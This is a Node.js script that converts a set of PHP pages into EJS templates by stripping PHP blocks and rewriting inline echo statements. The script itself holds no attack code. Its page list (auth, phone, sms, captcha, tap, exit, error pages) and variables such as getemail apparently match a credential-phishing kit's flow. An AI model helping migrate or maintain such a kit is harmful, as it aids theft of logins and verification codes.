const fs = require('fs');
const path = require('path');

const phpDir = path.join(__dirname, '..', '..');
const viewsDir = path.join(__dirname, '..', 'views');

const pageMap = [
  { php: 'index.php', ejs: 'index.ejs' },
  { php: 'auth.php', ejs: 'auth.ejs' },
  { php: 'app.php', ejs: 'app.ejs' },
  { php: 'phone.php', ejs: 'phone.ejs' },
  { php: 'sms.php', ejs: 'sms.ejs' },
  { php: 'captcha.php', ejs: 'captcha.ejs' },
  { php: 'loading.php', ejs: 'loading.ejs' },
  { php: 'done.php', ejs: 'done.ejs' },
  { php: 'exit.php', ejs: 'exit.ejs' },
  { php: 'tap.php', ejs: 'tap.ejs' },
  { php: 'auth_error.php', ejs: 'auth_error.ejs' },
  { php: 'login_error.php', ejs: 'login_error.ejs' },
  { php: 'sms_error.php', ejs: 'sms_error.ejs' },
  { php: 'app_error.php', ejs: 'app_error.ejs' },
];

function stripLeadingPhp(content) {
  let result = content;
  while (true) {
    const trimmed = result.trimStart();
    if (!trimmed.startsWith('<?php') && !trimmed.startsWith('<?=')) {
      if (trimmed.startsWith('<!') || trimmed.startsWith('<') || trimmed.length === 0) {
        break;
      }
    }
    const match = trimmed.match(/^(<\?php[\s\S]*?\?>)/);
    if (match) {
      result = trimmed.slice(match[1].length);
    } else {
      break;
    }
  }
  return result;
}

function convertInlinePhp(html) {
  return html.replace(/<\?php\s+echo\s+(.+?);\s*\?>/g, (match, expr) => {
    let ejs = expr.trim();
    ejs = ejs.replace(/isset\((\$?\w+)\)/g, 'typeof $1 !== "undefined"');
    ejs = ejs.replace(/!empty\((\$?\w+)\)/g, '$1 && $1.length > 0');
    ejs = ejs.replace(/htmlspecialchars\(/g, '');
    ejs = ejs.replace(/\$(\w+)/g, (m, name) => `locals.${name}`);
    ejs = ejs.replace(/locals\.exit_url/g, 'config.exitUrl');
    ejs = ejs.replace(/locals\.(\w+)\s*\|\|\s*['"]?['"]?\s*/g, "locals.$1 || ''");
    return `<%= ${ejs} %>`;
  });
}

function addLocalsHeader(content) {
  return `<% const { user, home, homelive, getemail, name, session, config } = locals; %>\n${content}`;
}

for (const page of pageMap) {
  const phpPath = path.join(phpDir, page.php);
  const ejsPath = path.join(viewsDir, page.ejs);

  try {
    if (!fs.existsSync(phpPath)) {
      console.log(`Skipped (not found): ${page.php}`);
      continue;
    }
    let phpContent = fs.readFileSync(phpPath, 'utf8');
    let ejsContent = stripLeadingPhp(phpContent);
    ejsContent = convertInlinePhp(ejsContent);
    ejsContent = addLocalsHeader(ejsContent);
    fs.writeFileSync(ejsPath, ejsContent, 'utf8');
    console.log(`Converted: ${page.php} -> ${page.ejs} (${phpContent.length} -> ${ejsContent.length} chars)`);
  } catch (err) {
    console.error(`Error converting ${page.php}:`, err.message);
  }
}
